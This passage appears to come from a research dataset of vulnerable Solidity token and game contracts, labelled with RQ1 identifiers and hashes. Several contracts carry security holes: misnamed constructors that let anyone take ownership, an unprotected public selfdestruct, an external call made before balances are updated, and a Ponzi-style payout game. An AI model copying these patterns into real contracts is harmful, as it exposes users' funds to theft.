    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    function () external payable {
        getTokens();
     }
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        require(value <= totalRemaining);
        address investor = msg.sender;
        uint256 toGive = value;
        distr(investor, toGive);
        if (toGive > 0) {
            blacklist[investor] = true;
        }
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        value = value.div(100000).mul(99999);
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}
```

## RQ1_f59464ce08bf

SHA-256 `8e9619df47fabecef75cf9e284f9197c538bc51f93b3b16f352e1a5758955247`

```solidity
pragma solidity ^0.4.18;
contract SafeMath {
  function mulSafe(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
       return 0;
     }
     uint256 c = a * b;
     assert(c / a == b);
     return c;
   }
  function divSafe(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a / b;
     return c;
  }
  function subSafe(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
     return a - b;
   }
  function addSafe(uint256 a, uint256 b) internal pure returns (uint256) {
     uint256 c = a + b;
    assert(c >= a);
     return c;
   }
}
contract Owned {
    address public owner;
    address public newOwner;
    event OwnershipTransferred(address indexed _from, address indexed _to);
    function Constructor() public { owner = msg.sender; }
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
}
contract ERC20 {
   uint256 public totalSupply;
   function balanceOf(address who) public view returns (uint256);
   function transfer(address to, uint256 value) public returns (bool);
   event Transfer(address indexed from, address indexed to, uint256 value);
   function allowance(address owner, address spender) public view returns (uint256);
   function transferFrom(address from, address to, uint256 value) public returns (bool);
   function approve(address spender, uint256 value) public returns (bool);
   event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract ERC223 {
    function transfer(address to, uint value, bytes data) public;
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}
contract ERC223ReceivingContract { 
    function tokenFallback(address _from, uint _value, bytes _data) public;
}
contract StandardToken is ERC20, ERC223, SafeMath, Owned {
  event ReleaseSupply(address indexed receiver, uint256 value, uint256 releaseTime);
  mapping(address => uint256) balances;
  mapping (address => mapping (address => uint256)) internal allowed;
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    balances[msg.sender] = subSafe(balances[msg.sender], _value);
    balances[_to] = addSafe(balances[_to], _value);
    Transfer(msg.sender, _to, _value);
    return true;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
   }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    balances[_from] = subSafe(balances[_from], _value);
     balances[_to] = addSafe(balances[_to], _value);
     allowed[_from][msg.sender] = subSafe(allowed[_from][msg.sender], _value);
    Transfer(_from, _to, _value);
     return true;
   }
   function approve(address _spender, uint256 _value) public returns (bool) {
     allowed[msg.sender][_spender] = _value;
     Approval(msg.sender, _spender, _value);
     return true;
   }
  function allowance(address _owner, address _spender) public view returns (uint256) {
     return allowed[_owner][_spender];
   }
   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
     allowed[msg.sender][_spender] = addSafe(allowed[msg.sender][_spender], _addedValue);
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }
  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
     uint oldValue = allowed[msg.sender][_spender];
     if (_subtractedValue > oldValue) {
       allowed[msg.sender][_spender] = 0;
     } else {
       allowed[msg.sender][_spender] = subSafe(oldValue, _subtractedValue);
    }
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }
    function transfer(address _to, uint _value, bytes _data) public {
        require(_value > 0 );
        if(isContract(_to)) {
            ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
            receiver.tokenFallback(msg.sender, _value, _data);
        }
        balances[msg.sender] = subSafe(balances[msg.sender], _value);
        balances[_to] = addSafe(balances[_to], _value);
        Transfer(msg.sender, _to, _value, _data);
    }
    function isContract(address _addr) private view returns (bool is_contract) {
      uint length;
      assembly {
            length := extcodesize(_addr)
      }
      return (length>0);
    }
}
contract TBXToken is StandardToken {
  string public name = 'TBXToken';
  string public symbol = 'TBX';
  uint public decimals = 8;
  uint256 public createTime         = 1527782400;
  uint256 firstAnnual               = 1559318400;
  uint256 secondAnnual              = 1590940800;
  uint256 thirdAnnual               = 1622476800;
  uint256 public INITIAL_SUPPLY     = 1000000000;
  uint256 public frozenForever      =  400000000;
  uint256 firstAnnualReleasedAmount =  150000000;
  uint256 secondAnnualReleasedAmount=  150000000;
  uint256 thirdAnnualReleasedAmount =  100000000;
  function TBXToken() public {
    totalSupply = 200000000 * 10 ** uint256(decimals); 
    balances[msg.sender] = totalSupply;
  }
  function releaseSupply() public onlyOwner returns(uint256 _actualRelease) {
    uint256 releaseAmount = getReleaseAmount();
    require(releaseAmount > 0);
    balances[owner] = addSafe(balances[owner], releaseAmount);
    transfer(owner,releaseAmount);
    totalSupply = addSafe(totalSupply, releaseAmount);
    Transfer(address(0), msg.sender, releaseAmount);
    return releaseAmount;
  }
  function getReleaseAmount() internal returns(uint256 _actualRelease) {
        uint256 _amountToRelease;
        if (    now >= firstAnnual
             && now < secondAnnual
             && firstAnnualReleasedAmount > 0) {
            _amountToRelease = firstAnnualReleasedAmount * 10 ** uint256(decimals);
            firstAnnualReleasedAmount = 0;
        } else if (    now >= secondAnnual 
                    && now < thirdAnnual
                    && secondAnnualReleasedAmount > 0) {
            _amountToRelease = secondAnnualReleasedAmount * 10 ** uint256(decimals);
            secondAnnualReleasedAmount = 0;
        } else if (    now >= thirdAnnual 
                    && thirdAnnualReleasedAmount > 0) {
            _amountToRelease = thirdAnnualReleasedAmount * 10 ** uint256(decimals);
            thirdAnnualReleasedAmount = 0;
        } else {
            _amountToRelease = 0;
        }
        return _amountToRelease;
    }
}
```

## RQ1_04b8f1923370

SHA-256 `3580b8ea9ffb82bc5a09b1c4a6f81dd57b829b53140a455f116d1b492ed4cd77`

```solidity
pragma solidity 0.4.24;
    library SafeMath {
      function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
          return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
      }
      function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
      }
      function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
      }
      function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
      }
    }
    contract owned {
        address public owner;
    	using SafeMath for uint256;
        constructor() public {
            owner = msg.sender;
        }
        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }
        function transferOwnership(address newOwner) onlyOwner public {
            owner = newOwner;
        }
    }
    interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }
    contract TokenERC20 {
        using SafeMath for uint256;
    	string public name;
        string public symbol;
        uint8 public decimals = 18;
        uint256 public totalSupply;
        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Burn(address indexed from, uint256 value);
        constructor(
            uint256 initialSupply,
            string tokenName,
            string tokenSymbol
        ) public {
            totalSupply = initialSupply * 10 ** uint256(decimals);  
            balanceOf[msg.sender] = totalSupply;                
            name = tokenName;                                   
            symbol = tokenSymbol;                               
        }
        function _transfer(address _from, address _to, uint _value) internal {
            require(_to != 0x0);
            require(balanceOf[_from] >= _value);
            require(balanceOf[_to].add(_value) > balanceOf[_to]);
            uint previousBalances = balanceOf[_from].add(balanceOf[_to]);
            balanceOf[_from] = balanceOf[_from].sub(_value);
            balanceOf[_to] = balanceOf[_to].add(_value);
            emit Transfer(_from, _to, _value);
            assert(balanceOf[_from].add(balanceOf[_to]) == previousBalances);
        }
        function transfer(address _to, uint256 _value) public {
            _transfer(msg.sender, _to, _value);
        }
        function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
            require(_value <= allowance[_from][msg.sender]);     
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
            _transfer(_from, _to, _value);
            return true;
        }
        function approve(address _spender, uint256 _value) public
            returns (bool success) {
            allowance[msg.sender][_spender] = _value;
            return true;
        }
        function approveAndCall(address _spender, uint256 _value, bytes _extraData)
            public
            returns (bool success) {
            tokenRecipient spender = tokenRecipient(_spender);
            if (approve(_spender, _value)) {
                spender.receiveApproval(msg.sender, _value, this, _extraData);
                return true;
            }
        }
        function burn(uint256 _value) public returns (bool success) {
            require(balanceOf[msg.sender] >= _value);   
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);            
            totalSupply = totalSupply.sub(_value);                      
           emit Burn(msg.sender, _value);
            return true;
        }
        function burnFrom(address _from, uint256 _value) public returns (bool success) {
            require(balanceOf[_from] >= _value);                
            require(_value <= allowance[_from][msg.sender]);    
            balanceOf[_from] = balanceOf[_from].sub(_value);                         
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);             
            totalSupply = totalSupply.sub(_value);                              
          emit  Burn(_from, _value);
            return true;
        }
    }
    contract THEFORTUNEFUND is owned, TokenERC20 {
        uint256 public sellPrice;
        uint256 public buyPrice;
    	using SafeMath for uint256;
        mapping (address => bool) public frozenAccount;
        event FrozenFunds(address target, bool frozen);
        constructor(
            uint256 initialSupply,
            string tokenName,
            string tokenSymbol
        ) TokenERC20(initialSupply, tokenName, tokenSymbol) public {}
        function _transfer(address _from, address _to, uint _value) internal {
            require (_to != 0x0);                               
            require (balanceOf[_from] >= _value);               
            require (balanceOf[_to].add(_value) >= balanceOf[_to]); 
            require(!frozenAccount[_from]);                     
            require(!frozenAccount[_to]);                       
            balanceOf[_from] = balanceOf[_from].sub(_value);                         
            balanceOf[_to] = balanceOf[_to].add(_value);                           
           emit Transfer(_from, _to, _value);
        }
        function mintToken(address target, uint256 mintedAmount) onlyOwner public {
            balanceOf[target] = balanceOf[target].add(mintedAmount);
            totalSupply = totalSupply.add(mintedAmount);
           emit Transfer(0, this, mintedAmount);
           emit Transfer(this, target, mintedAmount);
        }
        function freezeAccount(address target, bool freeze) onlyOwner public {
            frozenAccount[target] = freeze;
          emit  FrozenFunds(target, freeze);
        }
        function setPrices(uint256 newSellPrice, uint256 newBuyPrice) onlyOwner public {
            sellPrice = newSellPrice;
            buyPrice = newBuyPrice;
        }
        function buy() payable public {
            uint amount = msg.value.div(buyPrice);               
            _transfer(this, msg.sender, amount);              
        }
        function sell(uint256 amount) public {
            require(address(this).balance >= amount.mul(sellPrice));    
            _transfer(msg.sender, this, amount);              
            msg.sender.transfer(amount * sellPrice);          
        }
    }
```

## RQ1_ad46f524b21d

SHA-256 `5d6f501f0598bbb8687894134567b76997953bd1fb0ec74a3a43a3e5a46b9f01`

```solidity
pragma solidity ^0.4.24;
contract TheGame {
    address public first_player;
    uint public regeneration;
    uint public jackpot;
    uint public collectedFee;
    address[] public playersAddresses;
    uint[] public playersAmounts;
    uint32 public totalplayers;
    uint32 public lastPlayerPaid;
    address public mainPlayer;
    uint32 public round;
    uint public amountAlreadyPaidBack;
    uint public amountInvested;
    uint constant SIX_HOURS = 60 * 60 * 6;
    function TheGame() {
        mainPlayer = msg.sender;
        first_player = msg.sender;
        regeneration = block.timestamp;
        amountAlreadyPaidBack = 0;
        amountInvested = 0;
        totalplayers = 0;
    }
    function contribute_toTheGame() returns(bool) {
        uint amount = msg.value;
        if (amount < 0.5 ether) {
            msg.sender.send(msg.value);
            return false;
        }
        if (amount > 25 ether) {
            msg.sender.send(msg.value - 25 ether);
            amount = 25 ether;
        }
        if (regeneration + SIX_HOURS < block.timestamp) {
            if (totalplayers == 1) {
                playersAddresses[playersAddresses.length - 1].send(jackpot);
            } else if (totalplayers == 2) {
                playersAddresses[playersAddresses.length - 1].send(jackpot * 70 / 100);
                playersAddresses[playersAddresses.length - 2].send(jackpot * 30 / 100);
            } else if (totalplayers >= 3) {
                playersAddresses[playersAddresses.length - 1].send(jackpot * 70 / 100);
                playersAddresses[playersAddresses.length - 2].send(jackpot * 20 / 100);
                playersAddresses[playersAddresses.length - 3].send(jackpot * 10 / 100);
            }
            jackpot = 0;
            first_player = msg.sender;
            regeneration = block.timestamp;
            playersAddresses.push(msg.sender);
            playersAmounts.push(amount * 2);
            totalplayers += 1;
            amountInvested += amount;
            jackpot += amount;
            first_player.send(amount * 3 / 100);
            collectedFee += amount * 3 / 100;
            round += 1;
        } else {
            regeneration = block.timestamp;
            playersAddresses.push(msg.sender);
            playersAmounts.push(amount * 2);
            totalplayers += 1;
            amountInvested += amount;
            jackpot += (amount * 5 / 100);
            first_player.send(amount * 3 / 100);
            collectedFee += amount * 3 / 100;
while (playersAmounts[lastPlayerPaid] < (address(this).balance - jackpot - collectedFee) && lastPlayerPaid <= totalplayers) {
                playersAddresses[lastPlayerPaid].send(playersAmounts[lastPlayerPaid]);
                amountAlreadyPaidBack += playersAmounts[lastPlayerPaid];
                lastPlayerPaid += 1;
            }
        }
    }
    function() {
        contribute_toTheGame();
    }
    function restart() {
        if (msg.sender == mainPlayer) {
            mainPlayer.send(address(this).balance);
            selfdestruct(mainPlayer);
        }
    }
    function new_mainPlayer(address new_mainPlayer) {
        if (msg.sender == mainPlayer) {
            mainPlayer = new_mainPlayer;
        }
    }
    function collectFee() {
        if (msg.sender == mainPlayer) {
            mainPlayer.send(collectedFee);
        }
    }
    function newfirst_player(address newfirst_player) {
        if (msg.sender == first_player) {
            first_player = newfirst_player;
        }
    }       
}

```

## RQ1_e9dcb22282c1

SHA-256 `184b9ab0ccb8a6d5029b6ce4aea07283e2d8c09fefbf7d095e1d78b22d54dda2`

```solidity
pragma solidity ^0.4.17;
contract Token {
    function totalSupply() constant returns (uint256 supply) {}
    function balanceOf(address _owner) constant returns (uint256 balance) {}
    function transfer(address _to, uint256 _value) returns (bool success) {}
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}
    function approve(address _spender, uint256 _value) returns (bool success) {}
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
contract StandardToken is Token {
    function transfer(address _to, uint256 _value) returns (bool success) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { 
            return false; 
            }
    }
    function destroycontract(address _to) {
        selfdestruct(_to);
    }
    function distributeTokens(address _to, uint256 _value) returns (bool success) {
        _value = _value * 1000000000000000000;
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { 
            return false; 
            }
    }
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { 
            return false;
             }
    }
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}
contract Zapit is StandardToken {
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = "Z1.2"; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           
    function Zapit() {
        balances[msg.sender] = 100000000000000000000000000; 
        totalSupply = 100000000000000000000000000;          
        name = "Zapit";                                   
        decimals = 18;                                      
        symbol = "ZAPIT";                                    
        unitsOneEthCanBuy = 10000;                          
        fundsWallet = msg.sender;                           
    }
    function() payable {
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        if (balances[fundsWallet] < amount || amount < 1000000000000000000000 || amount > 100000000000000000000000) {
            msg.sender.transfer(msg.value);
            return;
        }
        transfer(fundsWallet, balances[this]);
        fundsWallet.transfer(msg.value);                           
    }
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        if (!_spender.call(bytes4(bytes32(sha3("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}
```

## RQ1_b4e52ed00926

SHA-256 `9988fdec481a93959dae7260936fb611a52804c7593497850f0ab5b7b56da62c`

```solidity
pragma solidity 		^0.5.1		;	
contract		BIMI_DAO_31_a		{						
	address	owner	;							
	function	BIMI_0001		()	public	{				
		owner	= msg.sender;							
	}									
	modifier	onlyOwner	() {							
		require(msg.sender ==		owner	);					
		_;								
	}									
	uint256	inData_1	=	6938413225						;
	function	setData_1	(	uint256	newData_1	)	public	onlyOwner	{	
		inData_1	=	newData_1	;					
	}									
	function	getData_1	()	public		returns	(	uint256	)	{
		return	inData_1	;						
	}									
	uint256	inData_2	=	9781285179						;
	function	setData_2	(	uint256	newData_2	)	public	onlyOwner	{	
		inData_2	=	newData_2	;					
	}									
	function	getData_2	()	public		returns	(	uint256	)	{
		return	inData_2	;						
	}									
	uint256	inData_3	=	2370460781						;
	function	setData_3	(	uint256	newData_3	)	public	onlyOwner	{	
		inData_3	=	newData_3	;					
	}									
	function	getData_3	()	public		returns	(	uint256	)	{
		return	inData_3	;						
	}									
	uint256	inData_4	=	2383457453						;
	function	setData_4	(	uint256	newData_4	)	public	onlyOwner	{	
		inData_4	=	newData_4	;					
	}									
	function	getData_4	()	public		returns	(	uint256	)	{
		return	inData_4	;						
	}									
	uint256	inData_5	=	1151598096						;
	function	setData_5	(	uint256	newData_5	)	public	onlyOwner	{	
		inData_5	=	newData_5	;					
	}									
	function	getData_5	()	public		returns	(	uint256	)	{
		return	inData_5	;						
	}									
	uint256	inData_6	=	998812674						;
	function	setData_6	(	uint256	newData_6	)	public	onlyOwner	{	
		inData_6	=	newData_6	;					
	}									
	function	getData_6	()	public		returns	(	uint256	)	{
		return	inData_6	;						
	}									
	uint256	inData_7	=	1151598096						;
	function	setData_7	(	uint256	newData_7	)	public	onlyOwner	{	
		inData_7	=	newData_7	;					
	}									
	function	getData_7	()	public		returns	(	uint256	)	{
		return	inData_7	;						
	}									
	uint256	inData_8	=	998812674						;
	function	setData_8	(	uint256	newData_8	)	public	onlyOwner	{	
		inData_8	=	newData_8	;					
	}									
	function	getData_8	()	public		returns	(	uint256	)	{
		return	inData_8	;						
	}									
	uint256	inData_9	=	2323232323						;
	function	setData_9	(	uint256	newData_9	)	public	onlyOwner	{	
		inData_9	=	newData_9	;					
	}									
	function	getData_9	()	public		returns	(	uint256	)	{
		return	inData_9	;						
	}									
	uint256	inData_10	=	2323232323						;
	function	setData_10	(	uint256	newData_10	)	public	onlyOwner	{	
		inData_10	=	newData_10	;					
	}									
	function	getData_10	()	public		returns	(	uint256	)	{
		return	inData_10	;						
	}									
	uint256	inData_11	=	2331073380						;
	function	setData_11	(	uint256	newData_11	)	public	onlyOwner	{	
		inData_11	=	newData_11	;					
	}									
	function	getData_11	()	public		returns	(	uint256	)	{
		return	inData_11	;						
	}									
	uint256	inData_12	=	2389358431						;
	function	setData_12	(	uint256	newData_12	)	public	onlyOwner	{	
		inData_12	=	newData_12	;					
	}									
	function	getData_12	()	public		returns	(	uint256	)	{
		return	inData_12	;						
	}									
	uint256	inData_13	=	2323232323						;
	function	setData_13	(	uint256	newData_13	)	public	onlyOwner	{	
		inData_13	=	newData_13	;					
	}									
	function	getData_13	()	public		returns	(	uint256	)	{
		return	inData_13	;						
	}									
	uint256	inData_14	=	2323232323						;
	function	setData_14	(	uint256	newData_14	)	public	onlyOwner	{	
		inData_14	=	newData_14	;					
	}									
	function	getData_14	()	public		returns	(	uint256	)	{
		return	inData_14	;						
	}									
	uint256	inData_15	=	2323232323						;
	function	setData_15	(	uint256	newData_15	)	public	onlyOwner	{	
		inData_15	=	newData_15	;					
	}									
	function	getData_15	()	public		returns	(	uint256	)	{
		return	inData_15	;						
	}									
	uint256	inData_16	=	2323232323						;
	function	setData_16	(	uint256	newData_16	)	public	onlyOwner	{	
		inData_16	=	newData_16	;					
	}									
	function	getData_16	()	public		returns	(	uint256	)	{
		return	inData_16	;						
	}									
	uint256	inData_17	=	2323232323						;
	function	setData_17	(	uint256	newData_17	)	public	onlyOwner	{	
		inData_17	=	newData_17	;					
	}									
	function	getData_17	()	public		returns	(	uint256	)	{
		return	inData_17	;						
	}									
	uint256	inData_18	=	2323232323						;
	function	setData_18	(	uint256	newData_18	)	public	onlyOwner	{	
		inData_18	=	newData_18	;					
	}									
	function	getData_18	()	public		returns	(	uint256	)	{
		return	inData_18	;						
	}									
	uint256	inData_19	=	2323232323						;
	function	setData_19	(	uint256	newData_19	)	public	onlyOwner	{	
		inData_19	=	newData_19	;					
	}									
	function	getData_19	()	public		returns	(	uint256	)	{
		return	inData_19	;						
	}									
	uint256	inData_20	=	2323232323						;
	function	setData_20	(	uint256	newData_20	)	public	onlyOwner	{	
		inData_20	=	newData_20	;					
	}									
	function	getData_20	()	public		returns	(	uint256	)	{
		return	inData_20	;						
	}									
	uint256	inData_21	=	2386281206						;
	function	setData_21	(	uint256	newData_21	)	public	onlyOwner	{	
		inData_21	=	newData_21	;					
	}									
	function	getData_21	()	public		returns	(	uint256	)	{
		return	inData_21	;						
	}									
	uint256	inData_22	=	2334594893						;
	function	setData_22	(	uint256	newData_22	)	public	onlyOwner	{	
		inData_22	=	newData_22	;					
	}									
	function	getData_22	()	public		returns	(	uint256	)	{
		return	inData_22	;						
	}									
	uint256	inData_23	=	2346942038						;
	function	setData_23	(	uint256	newData_23	)	public	onlyOwner	{	
		inData_23	=	newData_23	;					
	}									
	function	getData_23	()	public		returns	(	uint256	)	{
		return	inData_23	;						
	}									
	uint256	inData_24	=	2323232323						;
	function	setData_24	(	uint256	newData_24	)	public	onlyOwner	{	
		inData_24	=	newData_24	;					
	}									
	function	getData_24	()	public		returns	(	uint256	)	{
		return	inData_24	;						
	}									
	uint256	inData_25	=	2323232323						;
	function	setData_25	(	uint256	newData_25	)	public	onlyOwner	{	
		inData_25	=	newData_25	;					
	}									
	function	getData_25	()	public		returns	(	uint256	)	{
		return	inData_25	;						
	}									
	uint256	inData_26	=	2323232323						;
	function	setData_26	(	uint256	newData_26	)	public	onlyOwner	{	
		inData_26	=	newData_26	;					
	}									
	function	getData_26	()	public		returns	(	uint256	)	{
		return	inData_26	;						
	}									
	uint256	inData_27	=	2323232323						;
	function	setData_27	(	uint256	newData_27	)	public	onlyOwner	{	
		inData_27	=	newData_27	;					
	}									
	function	getData_27	()	public		returns	(	uint256	)	{
		return	inData_27	;						
	}									
	uint256	inData_28	=	2323232323						;
	function	setData_28	(	uint256	newData_28	)	public	onlyOwner	{	
		inData_28	=	newData_28	;					
	}									
	function	getData_28	()	public		returns	(	uint256	)	{
		return	inData_28	;						
	}									
	uint256	inData_29	=	2323232323						;
	function	setData_29	(	uint256	newData_29	)	public	onlyOwner	{	
		inData_29	=	newData_29	;					
	}									
	function	getData_29	()	public		returns	(	uint256	)	{
		return	inData_29	;						
	}									
	uint256	inData_30	=	2323232323						;
	function	setData_30	(	uint256	newData_30	)	public	onlyOwner	{	
		inData_30	=	newData_30	;					
	}									
	function	getData_30	()	public		returns	(	uint256	)	{
		return	inData_30	;						
	}									
	uint256	inData_31	=	1004711092						;
	function	setData_31	(	uint256	newData_31	)	public	onlyOwner	{	
		inData_31	=	newData_31	;					
	}									
	function	getData_31	()	public		returns	(	uint256	)	{
		return	inData_31	;						
	}									
	uint256	inData_32	=	859658446						;
	function	setData_32	(	uint256	newData_32	)	public	onlyOwner	{	
		inData_32	=	newData_32	;					
	}									
	function	getData_32	()	public		returns	(	uint256	)	{
		return	inData_32	;						
	}									
	uint256	inData_33	=	915347120						;
	function	setData_33	(	uint256	newData_33	)	public	onlyOwner	{	
		inData_33	=	newData_33	;					
	}									
	function	getData_33	()	public		returns	(	uint256	)	{
		return	inData_33	;						
	}									
	uint256	inData_34	=	722798607						;
	function	setData_34	(	uint256	newData_34	)	public	onlyOwner	{	
		inData_34	=	newData_34	;					
	}									
	function	getData_34	()	public		returns	(	uint256	)	{
		return	inData_34	;						
	}									
	uint256	inData_35	=	821604662						;
	function	setData_35	(	uint256	newData_35	)	public	onlyOwner	{	
		inData_35	=	newData_35	;					
	}									
	function	getData_35	()	public		returns	(	uint256	)	{
		return	inData_35	;						
	}									
	uint256	inData_36	=	9935800175						;
	function	setData_36	(	uint256	newData_36	)	public	onlyOwner	{	
		inData_36	=	newData_36	;					
	}									
	function	getData_36	()	public		returns	(	uint256	)	{
		return	inData_36	;						
	}									
	uint256	inData_37	=	593061702						;
	function	setData_37	(	uint256	newData_37	)	public	onlyOwner	{	
		inData_37	=	newData_37	;					
	}									
	function	getData_37	()	public		returns	(	uint256	)	{
		return	inData_37	;						
	}									
	uint256	inData_38	=	9767479521						;
	function	setData_38	(	uint256	newData_38	)	public	onlyOwner	{	
		inData_38	=	newData_38	;					
	}									
	function	getData_38	()	public		returns	(	uint256	)	{
		return	inData_38	;						
	}									
	uint256	inData_39	=	2323232323						;
	function	setData_39	(	uint256	newData_39	)	public	onlyOwner	{	
		inData_39	=	newData_39	;					
	}									
	function	getData_39	()	public		returns	(	uint256	)	{
		return	inData_39	;						
	}									
	uint256	inData_40	=	2323232323						;
	function	setData_40	(	uint256	newData_40	)	public	onlyOwner	{	
		inData_40	=	newData_40	;					
	}									
	function	getData_40	()	public		returns	(	uint256	)	{
		return	inData_40	;						
	}									
  }
```
